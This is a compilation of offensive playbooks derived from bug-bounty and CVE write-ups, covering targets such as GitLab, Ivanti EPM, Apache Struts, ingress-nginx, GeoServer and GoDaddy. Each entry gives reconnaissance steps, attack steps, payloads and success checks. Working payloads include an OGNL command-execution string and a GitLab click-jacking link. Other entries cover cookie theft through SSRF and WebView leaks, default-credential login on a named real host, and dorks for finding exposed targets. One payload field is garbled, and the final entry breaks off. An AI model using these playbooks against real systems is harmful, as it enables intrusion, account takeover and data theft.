attack_steps: Step 1: Craft a Jupyter notebook with a markdown cell containing an `<a>` tag. Configure `href` to a target API endpoint (e.g., /api/v4/user/status), `data-method` to 'put', `data-remote` to 'true', and `data-params` to include parameters to modify user data (e.g., `message=p0wn3d`).
Step 2: Store this crafted notebook in the GitLab instance.

Step 3: Trigger the rendering of the notebook. When a victim views the notebook, the invisible link with the specified attributes will be layered over the viewer, causing an HTTP request to be sent upon the first click.

Step 4: To escalate, craft a payload targeting a sensitive API endpoint and include parameters that grant the attacker elevated privileges or perform destructive actions (e.g., adding the attacker as a maintainer).
payloads_or_patterns: <a data-method="put" data-params="message=p0wn3d" data-remote="true" href="/api/v4/user/status" style="background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000" /a>
<a data-method="put" data-params="user_id=<ATTACKER_ID>&access_level=40" data-remote="true" data-url="/api/v4/pr..." /> (example for privilege escalation)
tools_recommended: Burp Suite: To intercept and analyze requests, and potentially craft more complex payloads.
GitLab instance: For uploading and testing the notebook.
success_indicators: The target user's status is updated (e.g., to 'p0wn3d').
The attacker is added as a maintainer to a project.
An HTTP request is successfully sent to the specified API endpoint with the crafted parameters.
failure_indicators: The HTML `<a>` tag is stripped or sanitized before rendering, or the `data-*` attributes are not processed.
The request to the API endpoint fails with a 4xx or 5xx error, or no request is made at all.

playbooks.impact: Ability to send arbitrary HTTP requests on behalf of authenticated users, leading to potential account takeovers, privilege escalation, data modification, or execution of unauthorized actions via GitLab's API.
playbooks.key_lesson: Always sanitize HTML content rendered from user-provided sources, especially when integrated with JavaScript libraries that can trigger side effects like AJAX requests.

meta.title: An unusual way to find XSS injection in one minute

trigger_conditions.when_to_apply: When a web application allows registration or profile updates using social logins (e.g., Yandex, Google) and displays user-provided profile information without proper sanitization.
prerequisites: Attacker must have control over a social media account (e.g., Yandex) with the ability to set custom first and last names.
The target application must integrate with the chosen social login provider.
applicability_signals: The target allows registration via Yandex or similar social providers.
User profile information (like name) is displayed publicly or on user-facing pages.
The writeup explicitly mentions Yandex as a viable social login for exploitation.
skip_if: Social login registration is not available.
All user-provided input displayed on the site is properly sanitized.
The target's Yandex integration has specific character restrictions that prevent payload concatenation across first and last name fields.

recon_steps: Step 1: Navigate to the target website and identify the social login options available for registration.
Step 2: Attempt to register an account using a Yandex account to confirm the integration and observe how the first and last names are handled and displayed.
attack_steps: Step 1: Create a Yandex account. Set the first name to a portion of the XSS payload (e.g., '{{constructor.constructor('alert(`XSS`)')()}}' split across fields).
Step 2: Set the last name to the remaining portion of the XSS payload, ensuring that when concatenated, they form a valid JavaScript execution string.
Step 3: Register a new account on the target website using this specially crafted Yandex account.
Step 4: Navigate to the user's public profile or any page where the user's full name is displayed.
Step 5: Observe if the JavaScript payload is executed in the browser context.
payloads_or_patterns: Example concatenated payload in a Yandex account: First Name: ">", Last Name: "" (This is a simpler example; the writeup uses a JS constructor payload)
tools_recommended: Burp Suite: To intercept and modify registration requests, although manual testing is described.
Browser Developer Tools: To observe JavaScript execution and DOM manipulation.
success_indicators: An alert box with 'XSS' or '1' is displayed when viewing the user's profile.
JavaScript code embedded in the name fields is executed by the browser.
failure_indicators: The social login registration fails due to invalid characters in the name fields.
The target website displays the payload as plain text without execution.
The alert box does not appear, indicating no JavaScript execution.

Suggestion: If direct payload injection fails due to character restrictions, try alternative encoding or bypass techniques. If social login is not the vector, explore other user input fields during registration or profile updates.

playbooks.impact: Stored Cross-Site Scripting (XSS) vulnerability. An attacker can execute arbitrary JavaScript in the victim's browser when they view the attacker-controlled user profile, leading to session hijacking, data theft, or defacement.
playbooks.key_lesson: Always sanitize user-provided input, even when sourced from third-party authentication providers like social logins. Pay close attention to how concatenated fields are rendered.

meta.title: Another vision for SSRF

affected_components: Functionality that makes requests to external URLs (e.g., data import from URL, publishing to URL)
tech_stack_fingerprints: Presence of cookies with domain matching *.example.com and HttpOnly flag set.
Application functionality that involves fetching data from a user-provided URL.

trigger_conditions.when_to_apply: This technique is applicable when a web application exhibits SSRF vulnerability and sets HttpOnly cookies on a domain that is a wildcard for subdomains, allowing cookie transmission to attacker-controlled endpoints. Crucially, the target application should have an authenticated section on the same wildcard domain.
prerequisites: The target application must be vulnerable to SSRF.
The target application must set HttpOnly cookies on a domain that is a wildcard for subdomains (e.g., domain=.example.com).
There must be an authenticated section within the same wildcard domain (e.g., app.example.com) that is accessible by users.
The SSRF vulnerability must allow redirection of requests to an attacker-controlled server.
The SSRF vulnerability must transmit client-side headers (including cookies) to the target URL.
applicability_signals: SSRF vulnerability identified.
Response headers show `Set-Cookie` with `domain=.example.com` and `HttpOnly` flag.
An authenticated section of the application exists on a subdomain of `example.com` (e.g., `app.example.com`).
skip_if: SSRF vulnerability does not reflect client headers in the request.
Cookies are not set with a wildcard domain.
No authenticated areas exist on subdomains of the affected domain.
The target application is not susceptible to SSRF.

recon_steps: Step 1: Identify an SSRF vulnerability in the target application. This could be through various means, such as parameter manipulation in URL fetching functionalities.
Step 2: Observe the `Set-Cookie` headers in the responses from the target application. Specifically, look for cookies set with a wildcard domain (e.g., `domain=.example.com`) and the `HttpOnly` flag.
Step 3: Identify an authenticated section of the application that resides on a subdomain within the wildcard domain (e.g., `app.example.com` if the cookie domain is `.example.com`).
attack_steps: Step 1: Set up an attacker-controlled server to receive incoming HTTP requests and log them. This server should be accessible from the internet.

Step 2: Craft a payload for the SSRF vulnerability that points to the attacker-controlled server. The payload should be designed to trigger a request from the vulnerable server to the attacker's endpoint.
Step 3: Send the crafted payload to the vulnerable endpoint. This will cause the target server to make a request to the attacker's server, including any relevant cookies.
Step 4: Monitor the attacker-controlled server's logs for incoming requests. The requests should contain the `HttpOnly` session cookies of authenticated users.
Step 5: Use the stolen session cookie to impersonate the victim user and gain unauthorized access to their account or sensitive data within the authenticated section of the application.
tools_recommended: Burp Suite: For intercepting and modifying requests, and for setting up a listener for incoming HTTP requests.
Netcat or a simple Python HTTP server: To act as the attacker-controlled server for logging incoming requests and cookies.
success_indicators: The attacker-controlled server receives HTTP requests from the target application's server.
The received requests contain `Cookie` headers with valid session tokens belonging to authenticated users.
The stolen session token can be successfully used to authenticate as the victim user on the target application.
failure_indicators: No requests are received on the attacker-controlled server: The SSRF is likely not working as intended or is blocked by network restrictions.
Requests are received but do not contain `Cookie` headers: The SSRF is not transmitting client-side headers correctly, or the vulnerable component is not the one setting the cookies.
Requests contain invalid or expired session tokens: The target user might not be actively logged in, or the cookies have expired.
A 403 Forbidden or similar error is returned on the authenticated application after using the stolen cookie: The session might be tied to specific IP addresses or other security measures.

playbooks.impact: Account takeover of authenticated users, leading to unauthorized access to sensitive data, performance of actions on behalf of the user, and potential further exploitation within the application.
playbooks.key_lesson: When an SSRF vulnerability is found, verify if the vulnerable component can be leveraged to steal `HttpOnly` cookies by directing requests to an attacker-controlled server, especially if those cookies are set with a wildcard domain and apply to authenticated sections of the application.

meta.title: Ivanti EPM Remote Code Execution

trigger_conditions.when_to_apply: When the target is an Ivanti EPM Cloud Appliance and accessible via the /index/client.php endpoint, with a 'c' cookie parameter that appears to be evaluated.
prerequisites: Target is an Ivanti EPM Cloud Appliance.
applicability_signals: Presence of the /index/client.php page.
Web server responds to requests for /index/client.php.
The 'c' cookie is present in requests to /index/client.php.
skip_if: No 'c' cookie parameter is accepted or processed.
Target is patched or not vulnerable.

recon_steps: Identify potential Ivanti EPM Cloud Appliance instances using Google dorks for 'LANDesk(R) Cloud Services Appliance'.
Browse to the /index/client.php page of identified targets to confirm its presence and functionality.
attack_steps: Step 1: Navigate to the /index/client.php page of the target Ivanti EPM Cloud Appliance using Burp Suite.
Step 2: Capture a legitimate request for /index/client.php in Burp Suite's Repeater tab.
Step 3: Modify the 'c' cookie value to a base64 encoded PHP command (e.g., base64_encode('phpinfo();')).
Step 4: Send the modified request to the server.
tools_recommended: Burp Suite Repeater: To manually craft and send requests.
Online Base64 Encoder/Decoder: To encode PHP commands.
success_indicators: The output of the executed PHP command is visible in the response (e.g., a phpinfo() page displayed).
HTTP status code 200 OK for the request with the malicious cookie.
failure_indicators: 400 Bad Request or other error codes indicate malformed input.
No visible output of the PHP command suggests the cookie is not being evaluated or is sanitized.
A 403 Forbidden response might indicate WAF blocking, requiring obfuscation of the payload.

playbooks.impact: Remote code execution as the 'nobody' user on the Ivanti EPM Cloud Appliance, allowing for unauthorized actions and potential further system compromise.
playbooks.key_lesson: Always test cookie parameters, especially those that appear to be used for authentication or session management, for unsafe evaluation functions like PHP's 'eval()' and ensure proper sanitization of user-supplied input.

meta.title: Is Exploiting A Null Pointer Deref For LPE Just A Pipe Dream?

affected_components: Named Pipes used for Inter-Process Communication (IPC)
tech_stack_fingerprints: Presence of named pipes listed by `pipelist` tool, specifically those used by `bdservicehost.exe`
Bitdefender GUI elements (system tray icon, start menu)

trigger_conditions.when_to_apply: When an attacker can interact with or observe Inter-Process Communication (IPC) mechanisms used by the Bitdefender antivirus software, particularly named pipes.
prerequisites: Ability to run arbitrary code or send data to named pipes on the target system.
Access to tools like `pipelist` and Process Monitor can aid discovery.
applicability_signals: Bitdefender processes (`bdservicehost.exe`, `seccenter.exe`, `vulnerability.scan.exe`) are observed to be running.
Named pipes are identified as being used by these processes.
skip_if: No accessible named pipes are found for Bitdefender processes.
The target system has enhanced security measures preventing arbitrary pipe interaction or data injection.

recon_steps: Step 1: Use `pipelist` from Sysinternals to enumerate named pipes on the system and identify those associated with Bitdefender processes (e.g., `bdservicehost.exe`).

Step 2: Use IO Ninja to spawn a named pipe server as a standard user and observe if Bitdefender client processes attempt to connect to it. Monitor the Bitdefender GUI for any connection attempts or errors when interacting with the AV.
Step 3: Use Process Monitor to observe file system activity, particularly crash dump file creation, when Bitdefender processes crash.
attack_steps: Step 1: Spawn a named pipe server as a standard user. Observe incoming connections from Bitdefender client processes (e.g., when opening the agent GUI).
Step 2: Capture the first 16 bytes of data sent by the client to the server upon connection.
Step 3: Echo these captured 16 bytes back to the client multiple times.
Step 4: Observe if the client disconnects and a Bitdefender error dialog appears, indicating a potential crash or instability.
Step 5: Monitor with Process Monitor for crash dump file creation. Note the directory where .dmp files are saved.
Step 6: If a crash dump is generated, analyze it to confirm the vulnerability (e.g., NULL pointer dereference).

Step 7: Identify processes that run with SYSTEM privileges (e.g., `vulnerability.scan.exe` spawned during a scan). Attempt to trigger the same IPC vulnerability on these privileged processes to achieve local privilege escalation.
payloads_or_patterns: Echo back the first 16 bytes of received data from the client multiple times.
tools_recommended: IO Ninja: For spawning named pipe servers and clients, observing IPC traffic.
Sysinternals `pipelist`: For enumerating named pipes.
Sysinternals Process Monitor: For observing file system activity, process creation, and crash dump generation.
success_indicators: Bitdefender error dialog appears after sending crafted data to the named pipe.
Crash dump files (.dmp) are created in a user-writable directory.
Observed NULL pointer dereference or other memory corruption indicators in the crash dump.
A SYSTEM-level process crashes or exhibits abnormal behavior, especially if it can be triggered remotely or leads to privilege escalation.
failure_indicators: No incoming connections to the named pipe server.
Client processes do not crash or show errors after sending crafted data.
Crash dumps are not generated, or they do not indicate a exploitable vulnerability.
If targeting `vulnerability.scan.exe` and it doesn't crash, the specific attack vector might not be applicable to that process, or the exploit needs refinement.

playbooks.impact: Local Denial of Service (DoS) on Bitdefender antivirus processes. Potential for Local Privilege Escalation (LPE) by crashing or exploiting vulnerabilities in SYSTEM-level Bitdefender processes triggered via named pipes.
playbooks.key_lesson: When dealing with IPC mechanisms like named pipes, manually crafting and sending unexpected data sequences can uncover vulnerabilities missed by automated fuzzing, especially in security software where proper error handling and input validation are critical.

meta.title: How I Mass hunt for Admin Panel Access…🤩

trigger_conditions.when_to_apply: When a target website reveals a GeoServer login panel, especially if default credentials are suspected.
prerequisites: Discovery of a GeoServer login page.
applicability_signals: Login page title includes 'GeoServer'
URL contains '/geoserver/'
Google Dorks like 'inurl:/geoserver/web/' return relevant results
skip_if: The GeoServer login page explicitly states 'no register option' and manual bypass attempts fail.
WAF blocks fuzzing attempts to discover hidden directories.

recon_steps: Step 1: Gather subdomains using tools like subfinder, amass, or chaos.
Step 2: Filter live domains and extract titles and status codes using httpx.
Step 3: Manually inspect URLs with titles indicating login panels (e.g., 'Obsurv — Log In').
Step 4: Use Nemesis or similar tools to identify hidden directories or parameters within JS files.
Step 5: Fuzz discovered directories (e.g., '/geoserver/') with a wordlist using ffuf to find accessible sub-paths.
attack_steps: Step 1: Navigate to the identified GeoServer login page (e.g., https://ibor.delft.nl/geoserver/web/).
Step 2: Attempt to log in using default GeoServer credentials: Username = 'admin', Password = 'geoserver'.
Step 3: If successful, access the GeoServer admin panel.
tools_recommended: subfinder, amass, chaos: For subdomain enumeration.
httpx, httprobe: For filtering live domains and gathering basic info.
Nemesis: For uncovering hidden JS paths/parameters.
ffuf: For directory fuzzing.
Burp Suite: For manual inspection and brute-forcing if needed.
success_indicators: Successful login to the GeoServer admin panel without prior credential knowledge.
Access to GeoServer administrative functionalities and data.
failure_indicators: Login attempt fails with invalid credentials.
GeoServer login panel redirects to an error page or has custom security measures.
Fuzzing returns only 403 or 404 errors for common directories.

playbooks.impact: Unauthorized access to the GeoServer administrative interface, allowing for potential data exfiltration, modification of geospatial data, or further compromise of the underlying server if misconfigurations are present.
playbooks.key_lesson: Always attempt common default credentials for known software like GeoServer when encountering login panels, especially after discovering administrative interfaces through fuzzing or directory discovery.

meta.title: External Authentication bypass in ingress-nginx

trigger_conditions.when_to_apply: When ingress-nginx is configured with external authentication and the external authentication service relies on path-based authorization without proper sanitization of the $request_uri.
prerequisites: ingress-nginx is installed and configured with an external authentication service.
The external authentication service is vulnerable to path traversal.
applicability_signals: External authentication is enabled in ingress-nginx configuration (e.g., auth-url annotation).
The external authentication service receives unnormalized or escaped path information (e.g., X-Original-Url, X-Auth-Request-Redirect headers).
skip_if: External authentication is not configured.
The external authentication service properly sanitizes or normalizes all incoming path information.

recon_steps: Step 1: Identify ingress-nginx deployments and verify if external authentication is configured using tools like `kubectl get ingress -A -o yaml` and inspecting annotations for `nginx.ingress.kubernetes.io/auth-url`.

Step 2: If external authentication is present, inspect the traffic sent to the external authentication service (e.g., by logging headers in the auth service or using a proxy) to observe the format of path-related headers like X-Original-Url and X-Auth-Request-Redirect.
attack_steps: Step 1: Send a request to a protected endpoint that is intended to be secured by the external authentication module.

Step 2: Modify the request path to include path traversal sequences (e.g., `..%2F` or `--path-as-is`). For example, target `/public-service/..%2Fprotected-service/protected` instead of `/protected-service/protected`.
Step 3: Observe the response from the server. If the authentication bypass is successful, the protected resource will be returned without proper authentication.
Step 4: If the initial path traversal attempt fails, experiment with different path normalization techniques and encodings.
tools_recommended: curl: For sending crafted HTTP requests.
kubectl: For inspecting Kubernetes ingress resources.
Burp Suite: For intercepting and modifying requests.
success_indicators: Receiving the content of a protected resource (e.g., `{"data" : "protected data"}`) when it should have returned a 401 Unauthorized or required specific headers.
The external authentication service returning a 204 No Content or similar success code for a request that should have been denied.
failure_indicators: Receiving a 401 Unauthorized response from the external authentication service, indicating that the path traversal was detected and blocked.
A 403 Forbidden response from ingress-nginx, suggesting a WAF or strict path validation.
If the external authentication service responds with a 5xx error, it might indicate an unexpected behavior caused by the crafted path, which could be a starting point for further fuzzing.

playbooks.impact: Bypass of external authentication mechanisms configured via ingress-nginx, allowing unauthorized access to protected resources.
playbooks.key_lesson: When ingress-nginx uses external authentication, always test for path traversal vulnerabilities in the request URI to bypass access controls enforced by the authentication service.

meta.title: Exploiting iOS app for fun and profit
meta.vuln_type: WebView Cookie Leakage leading to Account Takeover

tech_stack_fingerprints: Insider info from writeup suggests an iOS app

trigger_conditions.when_to_apply: When an iOS application allows users to post comments containing URLs, and its internal WebView component leaks cookies to those URLs.
prerequisites: Attacker can post a comment with a URL.
The target iOS app uses a WebView to render clicked links.
applicability_signals: User-generated content fields (like comments) that accept URLs.
The application uses a WebView to display external links.
Application is written for iOS.
skip_if: The WebView is configured to not send cookies.
The application does not use a WebView for external links.

recon_steps: Step 1: Identify user-generated content fields within the iOS application that can accept URL inputs.
Step 2: Attempt to post a comment containing a controllable URL (e.g., to a server controlled by the attacker).
attack_steps: Step 1: Post a comment containing a URL pointing to an attacker-controlled server. Example: 'Check out this link: <ATTACKER_CONTROLLED_URL>'.
Step 2: Observe incoming requests on the attacker-controlled server. If cookies are present in the request headers, the vulnerability is confirmed.
Step 3: Take the leaked authentication token (likely in a cookie like 'auth_token') and use it to make requests to the application's API on behalf of the victim.
Step 4: Request the '/api/v1/user/me' endpoint using the leaked session token to retrieve user information and confirm account access.
tools_recommended: Burp Suite Collaborator (or similar for receiving callbacks)
Curl (to replay API requests with leaked session tokens)
success_indicators: Receiving HTTP requests on the attacker-controlled server with cookies present in the headers.
A 200 OK response from the application's API (e.g., '/api/v1/user/me') containing victim user details (email, phone number, permissions, tokens) when using the leaked session token.
failure_indicators: No cookies are received on the attacker-controlled server when a link is clicked. The WebView might be configured securely or not configured to send cookies.
Requests to '/api/v1/user/me' with the leaked token result in 401 Unauthorized or other error codes, indicating the token is invalid or insufficient.

playbooks.impact: Attacker can perform account takeover by obtaining a victim's authentication token, allowing them to access and potentially modify the victim's account, access sensitive information (email, phone number, permissions), and generate new tokens.
playbooks.key_lesson: Always audit WebView configurations in mobile applications to ensure they do not leak sensitive cookies to external URLs, especially when rendering user-generated content.

meta.title: A Simple SQL Injection in an Air Force Website

affected_components: Blog comment functionality (implied by SQLi context)

trigger_conditions.when_to_apply: When a web application allows user-supplied input to be processed by a database query without proper sanitization.
prerequisites: The target website is built using Next.js and TailwindCSS.
A functionality exists that processes user input which is likely sent to a database.
applicability_signals: Existence of input fields that are not adequately sanitized (e.g., comment forms, search bars).
skip_if: All user input is escaped or parameterized before database interaction.
The web application uses a database that is not vulnerable to SQL injection.

recon_steps: Step 1: Browse the target website to identify input fields (e.g., search, comments, forms).
Step 2: Analyze HTTP requests for common input parameters in GET or POST requests.
attack_steps: Step 1: Submit a standard input (e.g., a comment) to observe the request and response.
Step 2: Modify the submitted input to include common SQL injection payloads like ' OR '1'='1' --
Step 3: Observe the response for changes in content, status codes, or error messages that indicate SQL query manipulation.
Step 4: If SQLi is suspected, use techniques like UNION-based or error-based SQLi to extract data.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, and to analyze responses.
SQLMap: For automated detection and exploitation of SQL injection vulnerabilities.
success_indicators: The website returns unexpected data.
The website displays database error messages.
The SQL injection payload bypasses filters and causes a change in the application's behavior.
failure_indicators: The application returns a 400 Bad Request or similar error for any malformed input.
A Web Application Firewall (WAF) blocks the request.
No discernible change in application behavior or response content.

playbooks.impact: Unauthorized access to sensitive data stored in the database, modification or deletion of data, and potential remote code execution depending on database privileges.
playbooks.key_lesson: Always sanitize and validate all user-supplied input before it is used in database queries to prevent SQL injection vulnerabilities.

meta.title: Bygone Vulnerabilities - Remote Code Execution in IBM Lotus SameTime Clients (CVE-2013-0553)

tech_stack_fingerprints: IBM Lotus Sametime client UI elements

trigger_conditions.when_to_apply: When the target is an IBM Lotus Sametime client that uses the Lotus Expeditor embedded browser and has the Active Content Filter (ACF) enabled but can be bypassed.
prerequisites: Attacker must be able to send messages to the target user.
The target Sametime client version must be vulnerable to ACF bypass.
applicability_signals: Presence of Lotus Expeditor embedded browser within the Sametime client.
Ability to render HTML messages.
Observed filtering of standard XSS payloads by the Active Content Filter (ACF).
skip_if: Sametime client version does not use Lotus Expeditor.
Active Content Filter (ACF) is not enabled or is configured to block most HTML tags without possibility of bypass.
All HTML messages are completely stripped of tags.

recon_steps: Identify the version of IBM Lotus Sametime client being used by the target.
Investigate the message rendering capabilities and any configured content filters (e.g., Active Content Filter - ACF).
attack_steps: Step 1: Craft an HTML message with a payload designed to bypass the Active Content Filter (ACF). This may involve researching specific bypass techniques for the ACF version.
Step 2: Send the crafted HTML message to the target IBM Lotus Sametime client.
Step 3: Observe if the crafted HTML is rendered and if it executes arbitrary code within the client's context.
Step 4: If initial bypass attempts fail, research and attempt alternative HTML encoding or obfuscation techniques to evade ACF.
payloads_or_patterns: HTML payload specifically crafted to bypass IBM's Active Content Filter (ACF). This is highly version-dependent and requires specific research into ACF bypasses, potentially involving malformed tags, unusual attributes, or JavaScript execution within allowed tags.
tools_recommended: Burp Suite: To craft and intercept HTML messages.
Custom scripts: For automating the sending of crafted messages and analyzing responses.
Web browser developer tools: For researching HTML rendering and potential bypasses.
success_indicators: Arbitrary code execution within the IBM Lotus Sametime client process.
Unexpected client behavior indicative of code execution (e.g., file system access, network connections, pop-ups not initiated by the user).
Successful exploitation of vulnerabilities like Pass-the-Hash, SMB Relay, or forced-CSRF if RCE is not directly achievable.
failure_indicators: Message is displayed as plain text or with malicious tags stripped out, indicating ACF is effectively blocking the payload (suggests trying more advanced bypasses or different attack vectors like SMB Relay).
Client crashes without any signs of code execution (suggests a parsing error rather than a security vulnerability).

playbooks.impact: Remote Code Execution (RCE) on the victim's machine, allowing the attacker to perform any action with the privileges of the Sametime client process.
playbooks.key_lesson: When dealing with embedded browsers in older applications, research specific security features like content filters (e.g., ACF) and their known bypasses, as they may not have the same robust security as modern browsers.

meta.title: DNN CMS Server-Side Request Forgery (CVE-2021-40186)

trigger_conditions.when_to_apply: When an authenticated user can upload an image by providing a URL, and the server uses HttpWebRequest to download the image without proper URL validation or redirection handling.
prerequisites: Attacker must have an authenticated user account.
The target DNN CMS version must be vulnerable (up to and including 9.10.2).
applicability_signals: User profile edit page with an option to upload an image via URL.
The `FileUploadController.UploadFromUrl` method is present in the application's backend.
skip_if: The server validates the final URL after redirects.
File extension validation is overly strict and cannot be bypassed.
No authenticated user roles exist or can be exploited.

recon_steps: Step 1: Identify an authenticated user account.
Step 2: Navigate to the profile edit page of the authenticated user.
Step 3: Observe the image upload functionality for an option to provide a URL.
attack_steps: Step 1: Craft a URL that points to an internal resource or an external service, ensuring the URL appears to reference an image (e.g., by having an image file extension).
Step 2: Submit the crafted URL to the profile edit page's image upload functionality.
Step 3: Monitor network traffic or logs for any callbacks or unexpected behavior indicating the server attempted to access the provided URL.

Step 4: If the initial URL doesn't trigger a response, attempt to use known SSRF payloads targeting internal IPs (e.g., 127.0.0.1, 10.0.0.1) or cloud metadata services (e.g., http://169.254.169.254/).
Step 5: If the server follows redirects, construct URLs that leverage redirects to reach the intended internal or external targets.
tools_recommended: Burp Suite: To intercept and modify requests, and to host malicious files or set up collaborative servers for detecting callbacks.
Nmap: To scan internal networks for open ports and services if internal IP ranges are identified.
success_indicators: The server makes a connection to an attacker-controlled server (e.g., Burp Collaborator showing a DNS lookup or HTTP request).
An error message or response from the target system reveals information about an internal resource.
The attacker gains access to sensitive information from cloud metadata services.
The profile picture is updated with content from an internal URL, indicating successful retrieval.
failure_indicators: The server returns an error indicating an invalid URL format or blocked extension, and no connection is made to external servers: Try to bypass file extension validation or use different redirection techniques.
The server returns a generic error without indicating a connection attempt: The SSRF vulnerability might be patched or not present in this specific component/version.

playbooks.impact: An attacker can force the DNN CMS server to make arbitrary network requests to internal or external systems. This can lead to accessing sensitive information from cloud metadata services, interacting with internal admin interfaces, exfiltrating data, or pivoting to attack other systems within the internal network.
playbooks.key_lesson: Always validate and sanitize URLs provided by users, especially when the server is instructed to fetch external resources. Implement strict checks for redirects and ensure that connections are only made to whitelisted domains or IP addresses.

meta.title: 2nd RCE and XSS in Apache Struts before 2.5.30

tech_stack_fingerprints: X-Powered-By: Undertow/Jetty (or similar web server indicating Java backend)
Server: WildFly/Tomcat/Jetty (or similar Java web server)

trigger_conditions.when_to_apply: When the target application utilizes Apache Struts versions prior to 2.5.30 and exposes components that use the `s:select` or `s:doubleselect` tags with user-controllable input in specific attributes.
prerequisites: Target application must be using an affected version of Apache Struts (2.5.0 - 2.5.29).
Attacker must be able to craft requests that are processed by the vulnerable Struts components.
applicability_signals: Presence of `s:select` or `s:doubleselect` tags in the application's HTML output or JSP files.
User-controllable input being passed to `listValueKey` attribute of `s:select` tag.
User-controllable input being passed to `name` attribute of `s:doubleselect` tag.
skip_if: Target application is running a patched version of Apache Struts (>= 2.5.30).
No `s:select` or `s:doubleselect` tags are present or user input is strictly sanitized/validated.

recon_steps: Step 1: Identify Apache Struts version by observing HTTP headers (e.g., X-Struts-Version, or inferred from error messages/behavior).
Step 2: Analyze application's HTML source and JavaScript for occurrences of `<s:select>` or `<s:doubleselect>` tags.
Step 3: If found, examine the attributes of these tags, particularly `listValueKey` for `s:select` and `name` for `s:doubleselect`, to identify if user input influences them.
attack_steps: Step 1: Craft an HTTP request targeting a vulnerable endpoint that renders an `s:select` tag. Set the `listValueKey` parameter to a malicious OGNL payload designed for RCE.
Step 2: For RCE, use the provided payload which leverages double OGNL evaluation via `getText` and `findValue` to execute arbitrary commands (e.g., `calc.exe`).
Step 3: For XSS, target the `name` parameter of an `s:doubleselect` tag with a crafted payload that executes JavaScript within the `onchange` event handler.
Step 4: URL-encode the payload appropriately to bypass any potential basic sanitization.
payloads_or_patterns: RCE Payload (URL Encoded): %{(a') + (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) + (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'})) + getText('b}
XSS Payload (example for `name` attribute of `s:doubleselect`): ' onchange='alert(document.domain)'
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially for crafting and sending payloads.
OWASP Dependency-Check: To identify if the target application is using vulnerable versions of Apache Struts.
success_indicators: RCE: Successful execution of the command (e.g., `calc.exe` pops up on the server or a network callback is received).
XSS: An alert box appears in the browser after interacting with the vulnerable element (e.g., selecting an option in the `s:select` or triggering the `onchange` event of `s:doubleselect`).
failure_indicators: 400 Bad Request or 500 Internal Server Error: Indicates the payload is not being processed correctly or is causing an unhandled exception, possibly due to sanitization or a different Struts version.

No alert box for XSS: The JavaScript is not executed, suggesting an incorrect payload or that the `onchange` event is not firing as expected. Try fuzzing the payload or targeting a different attribute/tag.

No RCE execution: The command does not run. This could be due to WAF blocking, specific server configurations, or the payload not reaching the OGNL evaluation correctly. Re-evaluate payload encoding and the context of the input.

playbooks.impact: Remote Code Execution (RCE) allowing arbitrary command execution on the server, leading to full system compromise. Cross-Site Scripting (XSS) allowing attackers to inject malicious scripts into user's browsers, potentially leading to session hijacking, phishing, or defacement.
playbooks.key_lesson: Always investigate double OGNL evaluation in templating engines like FreeMarker within web frameworks, as it can lead to RCE. Pay close attention to how user input is processed by functions like `getText` and `findString`/`findValue`.

meta.title: Hijacking Over 100k GoDaddy Websites

affected_components: Custom domain configuration within Website Builder

trigger_conditions.when_to_apply: When a domain is configured to use the GoDaddy Website Builder and the underlying DNS resolution points to GoDaddy's shared hosting IP addresses.
prerequisites: Attacker can identify GoDaddy shared hosting IP addresses.
Attacker can obtain a domain that is already pointing to GoDaddy shared hosting IP addresses.
applicability_signals: Target domain resolves to a GoDaddy shared hosting IP address (e.g., 198.71.232.11, 72.167.191.83).
GoDaddy Website Builder prompts for domain configuration.
skip_if: Target domain does not resolve to GoDaddy shared hosting IP addresses.
GoDaddy Website Builder performs validation on domain ownership before allowing configuration.

recon_steps: Step 1: Identify GoDaddy shared hosting IP addresses by going through the GoDaddy Website Builder domain connection flow with a legitimate domain and observing the provided IP address.
Step 2: Use passive DNS resources (e.g., SecurityTrails, DNSDumpster) to cross-reference the identified GoDaddy IP addresses and build a catalog of domains pointing to these IPs.
Step 3: For a target domain, verify its DNS resolution points to one of the identified GoDaddy shared hosting IP addresses.
attack_steps: Step 1: Within the GoDaddy Website Builder, initiate the process to connect a custom domain.
Step 2: In the prompt asking for the domain, input a domain that you control and that is already pointing to GoDaddy's shared web hosting services.
Step 3: Proceed through the configuration prompts in the Website Builder.
Step 4: After the attacker's domain is configured to use the attacker's website content, visit the victim's domain.
Step 5: (Optional) Disconnect the victim's domain from the attacker's site within the Website Builder.
payloads_or_patterns: Not applicable. The exploit relies on manipulating GoDaddy's infrastructure configuration.
tools_recommended: Burp Suite (for intercepting and analyzing HTTP requests/responses)
DNS lookup tools (e.g., dig, nslookup, online DNS lookup services)
Passive DNS databases (e.g., SecurityTrails, DNSDumpster)
success_indicators: Visiting the victim's domain (<TARGET_URL>) results in the attacker's website content being served instead of the victim's original website.
HTTP response from the victim's domain shows a '200 OK' status code with content from the attacker's website.
failure_indicators: Victim's original website is still served (indicates validation or proper configuration in place).
GoDaddy Website Builder prevents the input of the attacker-controlled domain (indicates a check for domain ownership or invalid configuration).
Target domain does not resolve to GoDaddy shared hosting IPs.

playbooks.impact: An attacker can take over any domain pointing to GoDaddy's shared hosting that is configured within the GoDaddy Website Builder. This allows the attacker to serve malicious Javascript (potentially stealing HttpOnly-less cookies), phishing content, or any other web content to visitors of the victim's domain.
playbooks.key_lesson: When dealing with services that offer custom domain configurations, always investigate how domain ownership and routing are validated, especially when multiple IP addresses or shared hosting environments are involved.

meta.title: The Printer Goes BRRRRR!!!
meta.authors: Mehdi Talbi, Rémi Jullian, Thomas Jeunet

trigger_conditions.when_to_apply: When access to the printer's firmware or bootloader is required for analysis or exploitation.
prerequisites: Physical access to the device is required to dump the flash memory.
